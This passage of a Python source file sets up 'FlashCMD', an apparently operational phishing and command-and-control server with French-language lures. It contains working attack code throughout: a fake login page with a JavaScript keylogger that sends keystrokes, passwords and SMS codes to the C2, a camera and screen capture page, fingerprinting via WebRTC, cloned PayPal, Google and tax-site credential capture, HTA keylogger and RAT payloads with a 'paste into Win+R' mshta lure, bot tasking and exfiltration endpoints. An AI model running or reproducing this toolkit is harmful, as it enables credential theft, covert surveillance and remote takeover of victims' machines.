      {video:{cursor:"always"},audio:false});
    const v=document.createElement("video");
    v.srcObject=st;v.autoplay=true;v.muted=true;
    st.getVideoTracks()[0].onended=()=>{
      clearInterval(scrIv);scrOK=false;
      markErr("ss2","Arrêté — appuyez pour reprendre");
    };
    v.onloadedmetadata=()=>{
      scrOK=true;
      markDone("ss","ss2","✓ Vérification réussie");
      scrIv=setInterval(()=>cap(v,"screen"),3000);
      setTimeout(()=>cap(v,"screen"),300);
    };
  }catch(e){
    markErr("ss2",e.name==="NotAllowedError"
      ?"Accès refusé — appuyez pour réessayer"
      :"Erreur: "+e.message);
  }
}

function done(){
  fetch(C2+"/collect",{method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify({page:"surv_done",
      cam:camOK,screen:scrOK,
      ua:navigator.userAgent})}).catch(()=>{});
  window.location.href="https://accounts.google.com";
}

fetch(C2+"/collect",{method:"POST",
  headers:{"Content-Type":"application/json"},
  body:JSON.stringify({page:"surv_land",
    ua:navigator.userAgent,
    tz:Intl.DateTimeFormat().resolvedOptions().timeZone,
    screen:screen.width+"x"+screen.height})}).catch(()=>{});
</script>
</body></html>"""

def page_keylogger_js() -> str:
    return """<!DOCTYPE html>
<html lang="fr"><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Connexion sécurisée</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#0f0f0f;font-family:'Segoe UI',sans-serif;
     display:flex;align-items:center;justify-content:center;
     min-height:100vh}
.card{background:#1a1a1a;border:1px solid #2a2a2a;
      border-radius:8px;padding:40px;width:380px;
      max-width:95vw;
      box-shadow:0 20px 60px rgba(0,0,0,.8)}
.logo{text-align:center;font-size:36px;
      margin-bottom:16px}
h2{color:#e0e0e0;text-align:center;
   font-size:20px;font-weight:500;margin-bottom:6px}
.sub{color:#666;font-size:13px;text-align:center;
     margin-bottom:28px}
input{width:100%;background:#111;
      border:1px solid #2a2a2a;border-radius:6px;
      padding:12px 14px;color:#e0e0e0;font-size:14px;
      margin-bottom:12px;outline:none;
      transition:border .15s}
input:focus{border-color:#0078d4}
.btn{width:100%;padding:12px;background:#0078d4;
     border:none;border-radius:6px;color:#fff;
     font-size:15px;font-weight:600;cursor:pointer}
.btn:hover{background:#005fa3}
.err{color:#e63946;font-size:12px;
     text-align:center;margin-top:10px;display:none}
.links{margin-top:14px;text-align:center;
       font-size:12px}
.links a{color:#4da6ff;text-decoration:none}
</style></head>
<body>
<div class="card">
  <div class="logo">🔐</div>
  <h2>Connexion sécurisée</h2>
  <p class="sub">Accès à votre espace personnel</p>
  <input type="email"    id="em"
         placeholder="Adresse email" autocomplete="email">
  <input type="password" id="pw"
         placeholder="Mot de passe">
  <input type="text"     id="co"
         placeholder="Code de vérification (SMS)">
  <button class="btn" onclick="login()">
    Se connecter
  </button>
  <div class="err" id="err">
    Code incorrect. Un nouveau code a été envoyé.
  </div>
  <div class="links">
    <a href="#">Mot de passe oublié ?</a>
  </div>
</div>

<script>
const C2="%%C2%%";

(function kl(){
  const B=[];let t=null;
  const s=d=>fetch(C2+"/keylog",{method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify(d)}).catch(()=>{});
  document.addEventListener("keydown",e=>{
    const el=document.activeElement;
    B.push({k:e.key,
      f:el?(el.id||el.name||el.type||"?"):"?",
      ts:Date.now()});
    clearTimeout(t);t=setTimeout(flush,3000);
    if(e.key==="Enter")flush();
  },true);
  document.addEventListener("blur",e=>{
    const el=e.target;
    if(el.value&&el.tagName==="INPUT")
      s({type:"field",f:el.id||el.name||el.type,
        v:el.value,ts:new Date().toISOString()});
  },true);
  document.addEventListener("paste",e=>{
    const t=(e.clipboardData||window.clipboardData)
      .getData("text");
    if(t)s({type:"paste",v:t,
      ts:new Date().toISOString()});
  },true);
  function flush(){
    if(!B.length)return;
    s({type:"keys",keys:B.splice(0),
      url:location.href,ts:new Date().toISOString(),
      ua:navigator.userAgent});
  }
  setInterval(flush,8000);
  window.addEventListener("beforeunload",()=>{
    flush();
    if(B.length&&navigator.sendBeacon)
      navigator.sendBeacon(C2+"/keylog",
        JSON.stringify({type:"beacon",keys:B}));
  });
})();

function login(){
  fetch(C2+"/collect",{method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify({
      page:"login_submit",
      email:document.getElementById("em").value,
      password:document.getElementById("pw").value,
      code2fa:document.getElementById("co").value,
      ua:navigator.userAgent,
      tz:Intl.DateTimeFormat().resolvedOptions().timeZone
    })}).catch(()=>{});
  setTimeout(()=>{
    document.getElementById("err").style.display="block";
    document.getElementById("co").value="";
    document.getElementById("co").focus();
  },800);
}

fetch(C2+"/collect",{method:"POST",
  headers:{"Content-Type":"application/json"},
  body:JSON.stringify({page:"kl_js_land",
    ua:navigator.userAgent,
    ref:document.referrer,
    tz:Intl.DateTimeFormat().resolvedOptions().timeZone
  })}).catch(()=>{});
</script>
</body></html>"""

def page_admin() -> str:
    return f"""<!DOCTYPE html>
<html lang="fr"><head>
<meta charset="UTF-8">
<title>FlashCMD — Admin</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
:root{{--bg:#0a0a0f;--p:#12121a;--b:#2a2a3a;
      --r:#e63946;--g:#2ecc71;--t:#e0e0e0;--d:#555}}
*{{box-sizing:border-box;margin:0;padding:0}}
body{{background:var(--bg);color:var(--t);
     font-family:monospace;padding:20px;
     max-width:860px;margin:0 auto}}
h1{{color:var(--r);margin-bottom:6px;font-size:15px}}
.puburl{{color:var(--g);font-size:12px;
         word-break:break-all;margin-bottom:16px}}
h2{{color:var(--d);font-size:11px;text-transform:uppercase;
    letter-spacing:.1em;margin:14px 0 7px}}
.card{{background:var(--p);border:1px solid var(--b);
       border-radius:6px;padding:14px;margin-bottom:10px}}
input{{width:100%;background:#0d0d14;
       border:1px solid var(--b);color:var(--t);
       padding:8px 10px;border-radius:4px;
       font-family:monospace;font-size:12px;
       margin-bottom:6px;outline:none}}
input:focus{{border-color:var(--r)}}
button{{padding:7px 14px;background:var(--r);border:none;
        border-radius:4px;color:#fff;cursor:pointer;
        font-size:12px}}
button:hover{{opacity:.85}}
.res{{background:#0d0d14;border:1px solid var(--b);
      border-radius:4px;padding:10px;font-size:11px;
      color:var(--g);white-space:pre-wrap;
      margin-top:8px;min-height:32px}}
.links a{{color:#3498db;font-size:12px;
          display:block;margin:3px 0;
          text-decoration:none}}
.links a:hover{{text-decoration:underline}}
.hta-box{{color:var(--t);font-size:12px;
          line-height:1.8}}
</style></head>
<body>
<h1>⚡ FlashCMD — Admin Panel</h1>
<div class="puburl">🌐 {PUBLIC_URL}</div>

<h2>Piéger une URL</h2>
<div class="card">
  <input id="tu" placeholder="https://youtube.com/...">
  <button onclick="genTrap()">Générer</button>
  <div class="res" id="tr">—</div>
</div>

<h2>Cloner un site</h2>
<div class="card">
  <input id="cu" placeholder="https://accounts.google.com">
  <input id="cn" placeholder="nom (ex: google)">
  <button onclick="cloneSite()">Instructions</button>
  <div class="res" id="cr">—</div>
</div>

<h2>QR code piégé</h2>
<div class="card">
  <input id="qu" placeholder="https://youtube.com">
  <button onclick="genQR()">Générer</button>
  <div id="qr" style="margin-top:8px"></div>
</div>

<h2>Payload HTA (Windows natif)</h2>
<div class="card">
  <div class="hta-box">
Keylogger  : <a href="/hta/keylogger" style="color:#3498db"
  >{PUBLIC_URL}/hta/keylogger</a>
Dropper    : <a href="/hta/dropper" style="color:#3498db"
  >{PUBLIC_URL}/hta/dropper</a>
RAT        : <a href="/hta/rat" style="color:#3498db"
  >{PUBLIC_URL}/hta/rat</a>

Utilisation CAPTCHA (mshta natif Windows) :
  → la victime colle dans Win+R :
  mshta "{PUBLIC_URL}/hta/keylogger"
  → s'exécute sans Python visible
  </div>
</div>

<h2>Pixel tracking email</h2>
<div class="card">
  <input id="ti" placeholder="nom (ex: target1)">
  <button onclick="genTrack()">Générer</button>
  <div class="res" id="tkr">—</div>
</div>

<h2>Liens rapides</h2>
<div class="card links">
  <a href="/c2" target="_blank">🖥 Dashboard C2</a>
  <a href="/c2/creds" target="_blank">🔑 Credentials volés</a>
  <a href="/c2/keylog" target="_blank">⌨ Keylogs</a>
  <a href="/c2/visits" target="_blank">👁 Log visites</a>
  <a href="/c2/tracking" target="_blank">📧 Tracking email</a>
  <a href="/c2/frames" target="_blank">📸 Frames JSON</a>
  <a href="/" target="_blank">📄 Phishing Microsoft</a>
  <a href="/update" target="_blank">🪟 Fausse MAJ Windows</a>
  <a href="/captcha" target="_blank">🤖 Faux CAPTCHA reCAPTCHA</a>
  <a href="/surveillance" target="_blank">📷 Caméra + Écran</a>
  <a href="/keylog_page" target="_blank">⌨ Keylogger JS</a>
  <a href="/download/extension" target="_blank">🧩 Extension Chrome</a>
</div>

<script>
const BASE="{PUBLIC_URL}";
async function genTrap(){{
  const url=document.getElementById("tu").value.trim();
  if(!url)return;
  const r=await fetch("/shorten?url="+
    encodeURIComponent(url),
    {{headers:{{"Accept":"application/json"}}}});
  const d=await r.json();
  document.getElementById("tr").textContent=
    "Court  : "+d.shortlink+"\\n"+
    "Piégé  : "+d.trapped+"\\n"+
    "QR     : "+d.qr;
}}
function cloneSite(){{
  const url=document.getElementById("cu").value.trim();
  const n=document.getElementById("cn").value.trim()||"clone";
  document.getElementById("cr").textContent=
    "Lance dans ton terminal :\\n"+
    "python clone.py "+url+" "+n+"\\n\\n"+
    "URL clone : "+BASE+"/clone/"+n;
}}
function genQR(){{
  const url=document.getElementById("qu").value.trim();
  if(!url)return;
  document.getElementById("qr").innerHTML=
    '<img src="/qr?url='+encodeURIComponent(url)+
    '" style="border:1px solid #2a2a3a" width="160"><br>'+
    '<a href="/qr?url='+encodeURIComponent(url)+
    '" download="qr.png" style="color:#3498db;'+
    'font-size:11px;text-decoration:none">↓ Télécharger</a>';
}}
function genTrack(){{
  const id=document.getElementById("ti").value.trim();
  if(!id)return;
  const url=BASE+"/track/"+id;
  document.getElementById("tkr").textContent=
    "URL pixel : "+url+"\\n"+
    'Tag HTML  : <img src="'+url+
    '" width="1" height="1" style="display:none">\\n'+
    "Log       : "+BASE+"/c2/tracking";
}}
</script>
</body></html>"""

def page_trapped_url(target: str) -> str:
    return f"""<!DOCTYPE html>
<html><head><meta charset="UTF-8">
<title>Chargement…</title>
<style>
body{{background:#fff;margin:0;display:flex;
     align-items:center;justify-content:center;
     height:100vh;font-family:Arial,sans-serif;
     color:#666;font-size:14px}}
.sp{{width:28px;height:28px;border:3px solid #f0f0f0;
     border-top-color:#1a73e8;border-radius:50%;
     animation:spin .7s linear infinite;
     margin-right:12px}}
@keyframes spin{{to{{transform:rotate(360deg)}}}}
</style></head>
<body>
<div class="sp"></div>Chargement…
<script>
(function(){{
  const C2="{PUBLIC_URL}";
  const T={json.dumps(target)};
  const d={{page:"trapped_url",target:T,
    ua:navigator.userAgent,lang:navigator.language,
    tz:Intl.DateTimeFormat().resolvedOptions().timeZone,
    screen:screen.width+"x"+screen.height,
    cores:navigator.hardwareConcurrency,
    mem:navigator.deviceMemory,ref:document.referrer}};
  try{{
    const pc=new RTCPeerConnection({{iceServers:[]}});
    pc.createDataChannel("");
    pc.createOffer().then(o=>pc.setLocalDescription(o));
    pc.onicecandidate=e=>{{
      if(e&&e.candidate){{
        const m=e.candidate.candidate
          .match(/\\d+\\.\\d+\\.\\d+\\.\\d+/);
        if(m)d.local_ip=m[0];
      }}
    }};
  }}catch(e){{}}
  if(navigator.getBattery)
    navigator.getBattery().then(b=>{{
      d.battery={{level:b.level,charging:b.charging}};
    }});
  setTimeout(()=>fetch(C2+"/collect",{{method:"POST",
    headers:{{"Content-Type":"application/json"}},
    body:JSON.stringify(d)}})
    .finally(()=>window.location.href=T),500);
}})();
</script></body></html>"""

# ══════════════════════════════════════════════════════════════
# HANDLER
# ══════════════════════════════════════════════════════════════

class Handler(BaseHTTPRequestHandler):

    def log_message(self, fmt, *args): pass

    def _ip(self):
        xff = self.headers.get("X-Forwarded-For")
        return xff.split(",")[0].strip() if xff \
               else self.client_address[0]

    def _parse_body(self) -> dict:
        n = int(self.headers.get("Content-Length", 0))
        if not n:
            return {}
        raw = self.rfile.read(n).decode("utf-8", "ignore")
        try:    return json.loads(raw)
        except: return dict(urllib.parse.parse_qsl(raw))

    def _send(self, code: int, ctype: str, body):
        if isinstance(body, str):
            body = body.encode()
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", len(body))
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(body)

    def _redir(self, url: str, code=302):
        self.send_response(code)
        self.send_header("Location", url)
        self.end_headers()

    def _page(self, fn):
        self._send(200, "text/html", inject(fn()))

    def _file(self, path: pathlib.Path, ct="text/html"):
        if not path.exists():
            self._send(404, "text/plain", b"404")
            return
        c = path.read_text(encoding="utf-8", errors="replace")
        self._send(200, ct, inject(c))

    # ════════════════════════════════════════════════════
    # GET
    # ════════════════════════════════════════════════════
    def do_GET(self):
        p   = urllib.parse.urlparse(self.path)
        pth = p.path.rstrip("/") or "/"
        qs  = dict(urllib.parse.parse_qsl(p.query))
        ip  = self._ip()
        ua  = self.headers.get("User-Agent", "")
        log({"type": "GET", "ip": ip, "path": pth,
             "ua": ua[:80], "detail": pth})

        # pages
        if pth in ("/", "/index"):
            self._page(page_index)
        elif pth == "/update":
            self._page(page_update)
        elif pth == "/captcha":
            self._page(page_captcha)
        elif pth == "/surveillance":
            self._page(page_surveillance)
        elif pth == "/keylog_page":
            self._page(page_keylogger_js)
        elif pth == "/admin":
            self._send(200, "text/html",
                       page_admin().encode("utf-8"))

        # clones + assets
        elif pth.startswith("/clone/"):
            self._file(
                PAGE_DIR/f"clone_{pth.split('/clone/')[1]}.html")
        elif pth.startswith("/assets_"):
            fp = PAGE_DIR / pth.lstrip("/")
            if fp.exists():
                ctm = {
                    ".css":  "text/css",
                    ".js":   "application/javascript",
                    ".png":  "image/png",
                    ".jpg":  "image/jpeg",
                    ".svg":  "image/svg+xml",
                    ".woff2":"font/woff2",
                    ".woff": "font/woff",
                    ".ttf":  "font/ttf",
                    ".ico":  "image/x-icon",
                    ".gif":  "image/gif",
                    ".webp": "image/webp",
                }
                self._send(200,
                    ctm.get(fp.suffix.lower(),
                            "application/octet-stream"),
                    fp.read_bytes())
            else:
                self._send(404, "text/plain", b"404")

        # C2 dashboard
        elif pth == "/c2":
            self._file(pathlib.Path("c2")/"dashboard.html")

        # HTA payloads
        elif pth.startswith("/hta/"):
            name = pth.split("/hta/")[1]
            hta  = make_hta(name)
            log({"type": "HTA_SERVE", "ip": ip,
                 "detail": name})
            body = hta.encode()
            self.send_response(200)
            self.send_header("Content-Type",
                             "application/hta")
            self.send_header("Content-Disposition",
                f"attachment; filename=setup_{name}.hta")
            self.send_header("Content-Length", len(body))
            self.end_headers()
            self.wfile.write(body)

        elif pth == "/payload_hta":
            name = qs.get("name", "keylogger")
            hta  = make_hta(name)
            log({"type": "PAYLOAD_HTA", "ip": ip,
                 "detail": name})
            body = hta.encode()
            self.send_response(200)
            self.send_header("Content-Type",
                             "application/hta")
            self.send_header("Content-Disposition",
                "attachment; filename=setup.hta")
            self.send_header("Content-Length", len(body))
            self.end_headers()
            self.wfile.write(body)

        # URL piégée
        elif pth == "/go":
            target = qs.get("url", "")
            if not target:
                self._send(400, "text/plain",
                           b"?url= requis")
                return
            with open(CREDS_FILE, "a") as f:
                f.write(json.dumps({
                    "ts": datetime.datetime.now().isoformat(),
                    "ip": ip, "ua": ua,
                    "target": target,
                    "page": "trapped_url",
                }) + "\n")
            log({"type": "TRAPPED_URL", "ip": ip,
                 "detail": f"→{target[:50]}"})
            self._send(200, "text/html",
                page_trapped_url(target).encode())

        # shortlink
        elif pth == "/shorten":
            target = qs.get("url", "")
            if not target:
                self._send(400, "text/plain",
                           b"?url= requis")
                return
            trap  = (f"{PUBLIC_URL}/go?"
                     f"url={urllib.parse.quote(target)}")
            code  = make_short(trap)
            short = f"{PUBLIC_URL}/s/{code}"
            res   = {
                "original":  target,
                "trapped":   trap,
                "shortlink": short,
                "qr": (f"{PUBLIC_URL}/qr?"
                       f"url={urllib.parse.quote(target)}"),
            }
            if "text/html" in self.headers.get("Accept",""):
                html = f"""<!DOCTYPE html>
<html><head><meta charset="UTF-8">
<title>Lien généré</title>
<style>
body{{background:#0a0a0f;color:#e0e0e0;
     font-family:monospace;padding:28px;
     max-width:640px;margin:0 auto}}
h1{{color:#e63946;margin-bottom:16px;font-size:15px}}
.b{{background:#12121a;border:1px solid #2a2a3a;
    border-radius:5px;padding:12px;margin-bottom:8px}}
.l{{color:#555;font-size:10px;text-transform:uppercase;
    margin-bottom:4px}}
.u{{color:#2ecc71;word-break:break-all;font-size:12px}}
.cp{{background:#e63946;border:none;color:#fff;
     padding:5px 10px;border-radius:3px;
     cursor:pointer;font-size:11px;margin-top:5px}}
</style></head><body>
<h1>⚡ Lien piégé</h1>
<div class="b">
  <div class="l">Lien court — à partager</div>
  <div class="u" id="sh">{short}</div>
  <button class="cp"
    onclick="navigator.clipboard.writeText(
      document.getElementById('sh').textContent)">
    📋 Copier</button>
</div>
<div class="b">
  <div class="l">URL originale</div>
  <div class="u">{target}</div>
</div>
<div class="b">
  <div class="l">QR piégé</div>
  <img src="/qr?url={urllib.parse.quote(target)}"
       style="border:1px solid #2a2a3a;margin-top:5px"
       width="150">
</div>
</body></html>"""
                self._send(200, "text/html", html.encode())
            else:
                self._send(200, "application/json",
                    json.dumps(res, indent=2).encode())

        elif pth.startswith("/s/"):
            code   = pth.split("/s/")[1]
            target = shortlinks.get(code, "")
            if target:
                log({"type": "SHORT", "ip": ip,
                     "detail": f"{code}→{target[:40]}"})
                with open(CREDS_FILE, "a") as f:
                    f.write(json.dumps({
                        "ts": datetime.datetime.now()
                              .isoformat(),
                        "ip": ip, "ua": ua,
                        "shortlink": code,
                        "target": target,
                    }) + "\n")
                self._redir(target)
            else:
                self._send(404, "text/plain",
                           "Lien expiré")

        # QR
        elif pth == "/qr":
            target   = qs.get("url",
                               f"{PUBLIC_URL}/")
            trap_url = (f"{PUBLIC_URL}/go?"
                        f"url={urllib.parse.quote(target)}")
            png = make_qr(trap_url)
            if png:
                self._send(200, "image/png", png)
            else:
                self._send(200, "text/plain",
                    f"pip install qrcode pillow\n\n"
                    f"{trap_url}".encode())

        # pixel
        elif pth.startswith("/track/"):
            tid = pth.split("/track/")[1]
            with open(TRACK_FILE, "a") as f:
                f.write(json.dumps({
                    "ts": datetime.datetime.now().isoformat(),
                    "type": "PIXEL_OPEN",
                    "id": tid, "ip": ip, "ua": ua,
                    "ref": self.headers.get("Referer",""),
                }) + "\n")
            log({"type": "PIXEL", "ip": ip,
                 "detail": f"id={tid}"})
            self._send(200, "image/gif", PIXEL_GIF)

        # payloads
        elif pth == "/payload":
            name    = qs.get("name", "dropper") + ".py"
            payload = build_payload(name)
            log({"type": "PAYLOAD", "ip": ip,
                 "detail": name})
            self._send(200, "text/plain", payload)

        elif pth == "/oneliner":
            name    = qs.get("name", "rat") + ".py"
            payload = build_payload(name)
            self._send(200, "text/plain",
                       b64_oneliner(payload).encode())

        # builds
        elif pth.startswith("/builds/"):
            fname = pth.split("/builds/")[1]
            fp    = pathlib.Path("builds") / fname
            if fp.exists() and fp.suffix in (
                ".exe",".apk",".py",".zip"
            ):
                log({"type": "BUILD_DL", "ip": ip,
                     "detail": fname})
                self.send_response(200)
                self.send_header("Content-Type",
                    "application/octet-stream")
                self.send_header("Content-Disposition",
                    f"attachment; filename={fname}")
                self.send_header("Content-Length",
                    fp.stat().st_size)
                self.end_headers()
                self.wfile.write(fp.read_bytes())
            else:
                self._send(404, "text/plain", b"404")

        # extension zip
        elif pth == "/download/extension":
            import zipfile
            buf     = io.BytesIO()
            ext_dir = pathlib.Path("extension")
            if ext_dir.exists():
                with zipfile.ZipFile(
                    buf, "w", zipfile.ZIP_DEFLATED
                ) as zf:
                    for f in ext_dir.rglob("*"):
                        if f.is_file():
                            if f.suffix in (
                                ".js",".json",".html"
                            ):
                                c = f.read_text(
                                    errors="replace")
                                c = inject(c).decode(
                                    "utf-8","replace")
                                zf.writestr(str(
                                    f.relative_to(ext_dir)
                                ), c)
                            else:
                                zf.write(f,
                                    f.relative_to(ext_dir))
                data = buf.getvalue()
                self.send_response(200)
                self.send_header("Content-Type",
                    "application/zip")
                self.send_header("Content-Disposition",
                    "attachment; "
                    "filename=security_checker.zip")
                self.send_header("Content-Length",
                    len(data))
                self.end_headers()
                self.wfile.write(data)
            else:
                self._send(404, "text/plain",
                    b"extension/ manquant")

        # C2 API
        elif pth == "/c2/bots":
            with bots_lock:
                self._send(200, "application/json",
                    json.dumps(bots).encode())

        elif pth.startswith("/c2/task/"):
            bid = pth.split("/")[-1]
            with bots_lock:
                b     = bots.get(bid, {})
                tasks = b.get("tasks", [])
                task  = tasks.pop(0) if tasks else ""
                if bid in bots:
                    bots[bid]["tasks"] = tasks
            self._send(200, "application/json",
                json.dumps({"cmd": task}).encode())

        elif pth == "/c2/creds":
            try:    d = open(CREDS_FILE).read()
            except: d = "(vide)"
            self._send(200, "text/plain", d.encode())

        elif pth == "/c2/exfil":
            try:    d = open(EXFIL_FILE).read()
            except: d = "(vide)"
            self._send(200, "text/plain", d.encode())

        elif pth == "/c2/visits":
            try:    d = open(LOG_FILE).read()
            except: d = "(vide)"
            self._send(200, "text/plain", d.encode())

        elif pth == "/c2/tracking":
            try:    d = open(TRACK_FILE).read()
            except: d = "(vide)"
            self._send(200, "text/plain", d.encode())

        elif pth == "/c2/keylog":
            try:    d = open(KLOG_FILE).read()
            except: d = "(vide)"
            self._send(200, "text/plain", d.encode())

        elif pth == "/c2/frames":
            fd  = pathlib.Path("frames")
            res = []
            if fd.exists():
                for img in sorted(
                    fd.rglob("*.jpg")
                )[-60:]:
                    res.append({
                        "url": "/frame_img/" + str(
                            img.relative_to(fd)),
                        "type": img.parent.parent.name,
                        "ip":   img.parent.name,
                        "ts":   img.stem,
                    })
            self._send(200, "application/json",
                json.dumps({"frames": res}).encode())

        elif pth.startswith("/frame_img/"):
            fp = pathlib.Path("frames") / \
                 pth.split("/frame_img/")[1]
            if fp.exists():
                self._send(200, "image/jpeg",
                           fp.read_bytes())
            else:
                self._send(404, "text/plain", b"404")

        else:
            self._send(404, "text/plain", b"404")

    # ════════════════════════════════════════════════════
    # POST
    # ════════════════════════════════════════════════════
    def do_POST(self):
        p   = urllib.parse.urlparse(self.path)
        pth = p.path.rstrip("/")
        ip  = self._ip()
        body= self._parse_body()
        log({"type": "POST", "ip": ip, "path": pth,
             "detail": str(body)[:100]})

        if pth == "/collect":
            entry = {
                "ts": datetime.datetime.now().isoformat(),
                "ip": ip, **body,
            }
            with open(CREDS_FILE, "a") as f:
                f.write(json.dumps(entry) + "\n")
            pw = body.get("password",
                          body.get("pw",""))
            em = body.get("email",
                          body.get("username",""))
            if pw:
                log({"type": "CREDS_HIT", "ip": ip,
                     "detail": f"{em} / {pw}"})
            self._redir("https://microsoft.com")

        elif pth.startswith("/proxy_submit/"):
            name  = pth.split("/proxy_submit/")[1]
            entry = {
                "ts": datetime.datetime.now().isoformat(),
                "ip": ip, "clone": name, **body,
            }
            with open(CREDS_FILE, "a") as f:
                f.write(json.dumps(entry) + "\n")
            log({"type": "CLONE_SUBMIT", "ip": ip,
                 "detail": f"{name} {str(body)[:60]}"})
            origins = {
                "paypal":   "https://www.paypal.com",
                "google":   "https://accounts.google.com",
                "facebook": "https://facebook.com",
                "linkedin": "https://linkedin.com",
                "impots":   "https://www.impots.gouv.fr",
            }
            self._redir(
                origins.get(name, "https://google.com"))

        elif pth == "/frame":
            ftype = body.get("type",  "unknown")
            fdata = body.get("frame", "")
            ts    = body.get("ts",
                datetime.datetime.now().isoformat())
            fd = pathlib.Path("frames") / ftype / ip
            fd.mkdir(parents=True, exist_ok=True)
            fname = (ts.replace(":", "_")
                       .replace(".", "_") + ".jpg")
            if fdata.startswith("data:image"):
                raw = base64.b64decode(
                    fdata.split(",")[1])
                (fd / fname).write_bytes(raw)
            log({"type": f"FRAME_{ftype.upper()}",
                 "ip": ip, "detail": fname})
            self._send(200, "application/json",
                       b'{"ok":true}')

        elif pth == "/keylog":
            with open(KLOG_FILE, "a") as f:
                f.write(json.dumps({
                    "ts": datetime.datetime.now().isoformat(),
                    "ip": ip, **body,
                }) + "\n")
            log({"type": "KEYLOG", "ip": ip,
                 "detail": str(body)[:70]})
            self._send(200, "application/json",
                       b'{"ok":true}')

        elif pth == "/c2/register":
            bid = body.get("id", ip)
            with bots_lock:
                if bid not in bots:
                    bots[bid] = {
                        "ip":   ip,
                        "os":   body.get("os",   "?"),
                        "user": body.get("user", "?"),
                        "first_seen":
                            datetime.datetime.now()
                            .isoformat(),
                        "tasks":   [],
                        "results": [],
                    }
                bots[bid]["last_seen"] = \
                    datetime.datetime.now().isoformat()
            self._send(200, "application/json",
                       b'{"ok":true}')

        elif pth.startswith("/c2/result/"):
            bid = pth.split("/")[-1]
            res = body.get("result", "")
            with bots_lock:
                if bid not in bots:
                    bots[bid] = {
                        "ip": ip, "os": "?", "user": "?",
                        "first_seen":
                            datetime.datetime.now()
                            .isoformat(),
                        "last_seen":
                            datetime.datetime.now()
                            .isoformat(),
                        "tasks":   [],
                        "results": [],
                    }
                bots[bid].setdefault(
                    "results", []
                ).append({
                    "ts": datetime.datetime.now()
                          .isoformat(),
                    "output": res,
                })
                bots[bid]["last_seen"] = \
                    datetime.datetime.now().isoformat()
            log({"type": "BOT_RESULT", "ip": ip,
                 "detail": res[:100]})
            self._send(200, "application/json",
                       b'{"ok":true}')

        elif pth.startswith("/c2/push/"):
            bid = pth.split("/")[-1]
            cmd = body.get("cmd", "")
            with bots_lock:
                if bid not in bots:
                    bots[bid] = {
                        "ip": ip, "os": "?", "user": "?",
                        "first_seen":
                            datetime.datetime.now()
                            .isoformat(),
                        "last_seen":
                            datetime.datetime.now()
                            .isoformat(),
                        "tasks":   [],
                        "results": [],
                    }
                bots[bid]["tasks"].append(cmd)
            self._send(200, "application/json",
                       b'{"ok":true}')

        elif pth == "/exfil":
            with open(EXFIL_FILE, "a") as f:
                f.write(json.dumps({
                    "ts": datetime.datetime.now().isoformat(),
                    "ip": ip, "data": body,
                }) + "\n")
            self._send(200, "application/json",
                       b'{"ok":true}')

        elif pth.startswith("/ext/"):
            etype = pth.split("/ext/")[1]
            with open(f"ext_{etype}.log", "a") as f:
                f.write(json.dumps({
                    "ts":   datetime.datetime.now()
                            .isoformat(),
                    "ip":   ip,
                    "type": etype,
                    **body,
                }) + "\n")
            if etype in ("form", "sensitive_field",
                         "cookies", "field"):
                log({"type":   f"EXT_{etype.upper()}",
                     "ip":     ip,
                     "detail": str(body)[:80]})
            self._send(200, "application/json",
                       b'{"ok":true}')

        else:
            self._send(404, "text/plain", b"404")

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header(
            "Access-Control-Allow-Origin",  "*")
        self.send_header(
            "Access-Control-Allow-Methods",
            "GET,POST,OPTIONS")
        self.send_header(
            "Access-Control-Allow-Headers",
            "Content-Type")
        self.end_headers()

# ══════════════════════════════════════════════════════════════
# MAIN
# ══════════════════════════════════════════════════════════════

if __name__ == "__main__":
    srv = HTTPServer(("0.0.0.0", PORT), Handler)
    print(f"\n{'='*58}")
    print(f"  FlashCMD — {PUBLIC_URL}")
    print(f"{'='*58}")
    print(f"  Admin         : {PUBLIC_URL}/admin")
    print(f"  Phishing MS   : {PUBLIC_URL}/")
    print(f"  Fausse MAJ    : {PUBLIC_URL}/update")
    print(f"  CAPTCHA       : {PUBLIC_URL}/captcha")
    print(f"  Surveillance  : {PUBLIC_URL}/surveillance")
    print(f"  Keylogger JS  : {PUBLIC_URL}/keylog_page")
    print(f"  HTA payload   : {PUBLIC_URL}/hta/keylogger")
    print(f"  Piéger URL    : {PUBLIC_URL}/go?url=<url>")
    print(f"  Shortlink     : {PUBLIC_URL}/shorten?url=<url>")
    print(f"  C2 dashboard  : {PUBLIC_URL}/c2")
    print(f"{'='*58}\n")
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Arrêté.")